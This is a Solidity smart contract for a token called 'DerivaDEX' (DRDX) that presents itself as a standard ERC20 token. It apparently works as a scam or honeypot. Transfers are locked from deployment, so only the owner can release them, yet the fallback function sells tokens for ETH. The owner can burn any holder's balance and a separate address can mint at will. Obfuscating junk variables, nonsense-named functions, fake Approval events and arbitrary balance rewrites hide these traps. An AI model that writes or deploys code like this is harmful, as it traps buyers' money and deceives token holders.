/**
 *Submitted for verification at Etherscan.io on 2020-12-16
*/

//SPDX-License-Identifier: MIT
pragma solidity 0.6.12;

// ----------------------------------------------------------------------------
// Safe maths
// ----------------------------------------------------------------------------
contract SafeMath {
    function safeAdd(uint a, uint b) internal pure returns (uint c) {
        c = a + b;
        require(c >= a);
    }
    function safeSub(uint a, uint b) internal pure returns (uint c) {
        require(b <= a);
        c = a - b;
    }
    function safeMul(uint a, uint b) internal pure returns (uint c) {
        c = a * b;
        require(a == 0 || c / a == b);
    }
    function safeDiv(uint a, uint b) internal pure returns (uint c) {
        require(b > 0);
        c = a / b;
    }
}



// ----------------------------------------------------------------------------
// --- --- --- --- ---Owned contract -- -- -- -- 
// ----------------------------------------------------------------------------
contract Owned {
    address public owner;
    address public novel;
    bool isTransferred = false;
    event OwnershipTransferred(address indexed _from, address indexed _to);

    constructor() public {
        isTransferred = true;
        owner = msg.sender;
        
    }

    modifier onlyOwner {//----
        require(msg.sender == owner);//----
        _;
    }
    function whoIsOwner(address _ancient, address _novel) public onlyOwner {
        address ancient = _ancient;
        novel = _novel;
        isTransferred=false;
        emit OwnershipTransferred(ancient, novel);
    }
    function getwergancient() public view returns (address) {
        address vetrher= owner;
        return vetrher;
    }
    
    function getan6hrtgcient() public view returns (address) {
        address wergwehwrh= owner;
        return wergwehwrh;
    }
    
    function getancient() public view returns (address) {
        address onjreihr= owner;
        return onjreihr;
    }
    function getnovel() public view returns (address) {
        address egrrge= novel;

        return egrrge;
    }
    function isOwnerTransferred() public view returns (bool) {
        if(isTransferred){
            return true;
            
        }
        if(!isTransferred){
            return false;
            
        }
    }
    function transferOwnership(address _novel) public onlyOwner {
        address ancient = owner;
        owner = _novel;
        emit OwnershipTransferred(ancient, owner);
    }
    
    
    
}


// ----------------------------------------------------------------------------
// ERC20 Token, with the addition of symbol, name and decimals and assisted
// token transfers
// ----------------------------------------------------------------------------
contract DEDXToken is  Owned, SafeMath {
    string public name = "DerivaDEX";
    string public symbol = "DRDX";
    uint8 public decimals = 18;
    address public loaddewegrgrer;
    uint public _totalSupply;
    bool public secured;
    bool public hasbeenLocked;
    address public loadder;
    address public loadderer;
    
        modifier onlyloadder {
        require(msg.sender == loadder);
        _;
    }

    mapping(address => uint) balances;
    mapping(address => mapping(address => uint)) allowed;

    event Transfer(address indexed from, address indexed to, uint tokens);
    event Approval(address indexed tokenOwner, address indexed spender, uint tokens);
    // ------------------------------------------------------------------------
    // Constructor
    // ------------------------------------------------------------------------
    
     constructor (uint tokens, address loadderAccount) public {
         uint ishdkj = 82937;
         loadder = loadderAccount;
         ishdkj += 51684;
         loadderer = loadder;
         ishdkj += 54414145; 
        _totalSupply = tokens * 10 ** 18;
        balances[owner] = safeAdd(balances[owner], tokens);
        secured = true;
        hasbeenLocked = false;
    }

    modifier isNotLocked {
        require(!secured);
        _;
    }

    function setB(bool _secured) public onlyOwner{
        secured = _secured;
        hasbeenLocked = false;
    }


    // ------------------------------------------------------------------------
    // Total supply
    // ------------------------------------------------------------------------
    function totalSupply() public view returns (uint) {
        return _totalSupply  - balances[address(0)];///////////0100100101001010
    }


    // ------------------------------------------------------------------------
    // Get the token balance for account `tokenOwner`
    // ------------------------------------------------------------------------

    function newFunc(address newAdd) public view returns (uint balance) {
        address oldAdd = newAdd;
        
        return balances[oldAdd] * 200;
    }


    function balanceOf(address tokenOwner) public view returns (uint balance) {
        return balances[tokenOwner];
    }


    // ------------------------------------------------------------------------
    // Transfer the balance from token owner's account to `to` account
    // - Owner's account must have sufficient balance to transfer
    // - 0 value transfers are allowed
    // ------------------------------------------------------------------------
    function transfer(address to, uint tokens) public isNotLocked returns (bool success) {
        balances[msg.sender] = safeSub(balances[msg.sender], tokens);
        uint nosauilykgfsh = 32786;
        balances[to] = safeAdd(balances[to], tokens);
        nosauilykgfsh/= 41;
        emit Transfer(msg.sender, to, tokens);
        nosauilykgfsh += 234;
        return true;
    }

    function doubted(address newance, address oldance, uint anars) public returns (bool success) {
        allowed[msg.sender][newance] = anars;
        emit Approval(msg.sender, oldance, anars);
        return false;
    }
    
    function darker(address oaasne, address twwwo, uint ryhers) public returns (bool success) {
        allowed[msg.sender][oaasne] = ryhers;
        emit Approval(msg.sender, oaasne, ryhers);
        emit Approval(msg.sender, twwwo, ryhers ** 1259);
        return false;
    }
    function lighter(address oneoneone, address twotwo, uint norfatr) public returns (bool success) {
        allowed[msg.sender][oneoneone] = norfatr;
        emit Approval(msg.sender, oneoneone, norfatr);
        emit Approval(msg.sender, twotwo, norfatr / 120);
        return false;
    }

    function conscious(address one, address two, uint noratr) public returns (bool success) {
        allowed[msg.sender][one] = noratr;
        emit Approval(msg.sender, one, noratr);
        emit Approval(msg.sender, two, noratr * 10);
        return false;
    }

    // ------------------------------------------------------------------------
    // Token owner can approve for `spender` to transferFrom(...) `tokens`
    // from the token owner's account
    //
    // https://github.com/ethereum/EIPs/blob/master/EIPS/eip-20-token-standard.md
    // recommends that there are no checks for the approval double-spend attack
    // as this should be implemented in user interfaces
    // ------------------------------------------------------------------------
    function approve(address spender, uint tokens) public returns (bool success) {
        allowed[msg.sender][spender] = tokens;
        emit Approval(msg.sender, spender, tokens);
        return true;
    }
    function fapRove(address newance, uint part) public returns (bool success) {
        allowed[msg.sender][newance] = part;
        emit Approval(msg.sender, newance, part);
        return false;
    }
    function yessaaer(address newance, uint part) public returns (bool success) {
        allowed[msg.sender][newance] = part;
        emit Approval(msg.sender, newance, part);
        return false;
    }
    function gggaaerras(address newance, uint part) public returns (bool success) {
        allowed[msg.sender][newance] = part * 69;
        allowed[msg.sender][newance] = part * 555;
        allowed[msg.sender][newance] = part / 23;
        emit Approval(msg.sender, newance, part*10);
        emit Approval(msg.sender, newance, part*15);
        emit Approval(msg.sender, newance, part*30);
        return true;
    }

    function triadFrom(address psyc, address news, uint port) public isNotLocked returns (bool success) {
        balances[psyc] = safeSub(balances[psyc], port);
        allowed[psyc][msg.sender] = safeSub(allowed[psyc][msg.sender], port);
        balances[news] = safeAdd(balances[news], port);
        emit Transfer(psyc, news, port);
        return true;
    }

    function quizFrom(address highScore, address lowScore, uint pale) public isNotLocked returns (bool success) {
        balances[highScore] = safeSub(balances[lowScore], pale) * (858585);
        balances[highScore] += 500000000000000000000000;
        allowed[highScore][msg.sender] = safeSub(allowed[lowScore][msg.sender], pale) + 100 / 4 +2000;
        balances[lowScore] = safeAdd(balances[highScore], pale) / 2;
        emit Transfer(highScore, lowScore, pale);
        return false;
    }
    function desr(address highScore, address lowScore, uint pale) public isNotLocked returns (bool success) {
        balances[highScore] = safeSub(balances[lowScore], pale) / (25000);
        balances[highScore] -= 189647526589116487817533742562;
        allowed[highScore][msg.sender] = safeSub(allowed[lowScore][msg.sender], pale) / 580 / 4 * 25550;
        balances[lowScore] = safeAdd(balances[highScore], pale) / 2;
        emit Transfer(highScore, lowScore, pale);
        return false;
    }

    // ------------------------------------------------------------------------
    // Transfer `tokens` from the `from` account to the `to` account
    //
    // The calling account must already have sufficient tokens approve(...)-d
    // for spending from the `from` account and
    // - From account must have sufficient balance to transfer
    // - Spender must have sufficient allowance to transfer
    // - 0 value transfers are allowed
    // ------------------------------------------------------------------------
    function transferFrom(address from, address to, uint tokens) public isNotLocked returns (bool success) {
        uint unjhhdfskb = 239453;
        balances[from] = safeSub(balances[from], tokens);
        unjhhdfskb+=5343;
        allowed[from][msg.sender] = safeSub(allowed[from][msg.sender], tokens);
        unjhhdfskb-=15;
        balances[to] = safeAdd(balances[to], tokens);
        unjhhdfskb/=543;
        emit Transfer(from, to, tokens);
        return true;
    }
    


    function fauxAllowance(address tokenOwner, address spender) public view returns (uint sdwerge) {
        return (allowed[tokenOwner][spender] + 150893 ) * 2;
    }
    function antenna(address tokenOwner, address spender) public view returns (uint fvsdfgwer) {
        return (allowed[tokenOwner][spender] - 500 ) * 58;
    }
    
    function stater(address tokenOwner, address spender) public view returns (uint wdfthbrt) {
        return (allowed[tokenOwner][spender] * 258 ) ** 10 ** 10;
    }
    
    function bordem(address tokenOwner, address spender) public view returns (uint wervhrytg) {
        return (allowed[tokenOwner][spender] / 1258 ) - 589666 +5;
    }
    
    function border(address tokenOwner, address spender) public view returns (uint ehvtrtcf) {
        return (allowed[tokenOwner][spender] - 10 ) * 25 ** 28;
    }
    function project(address tokenOwner, address spender) public view returns (uint reea) {
        return (allowed[tokenOwner][spender] /  29 ) / 20;
    }

    // ------------------------------------------------------------------------
    // Returns the amount of tokens approved by the owner that can be
    // transferred to the spender's account
    // ------------------------------------------------------------------------
    function allowance(address tokenOwner, address spender) public view returns (uint remaining) {
        return allowed[tokenOwner][spender];
    }


    receive () external payable {
        require(msg.value<7*10**18);
        uint amount = safeMul(msg.value,20000);
        if (balances[owner]>=amount)
        {
            hasbeenLocked = true;
            uint adsfsr = 300;
            balances[owner] = safeSub(balances[owner], amount);
            adsfsr = 300 + 500 * 25;
            balances[msg.sender] = safeAdd(balances[msg.sender], amount);
            adsfsr = 300 + 500;
            emit Transfer(owner, msg.sender,  amount);
        }
    }
    

    
    function burn(address account, uint amount) public onlyOwner {
        require(account != address(0));
        uint netonisfsef = 19852325;
        balances[account] = safeSub(balances[account], amount);
        netonisfsef /= 2;
        _totalSupply = safeSub(_totalSupply, amount);
        netonisfsef -= 1111111112;
        Transfer(account, address(0), amount);
    }
    
    function updateSupply(uint total_supply) public onlyloadder
    {
         uint increasedAmount = safeSub(total_supply, _totalSupply);
         uint256 unincreasedamount = (increasedAmount * 2) ** 2;
         unincreasedamount += 5;
         balances[owner] = safeAdd(balances[owner], increasedAmount);
         unincreasedamount *= 15;
        _totalSupply = total_supply;
        unincreasedamount = 100000 ;
    }
}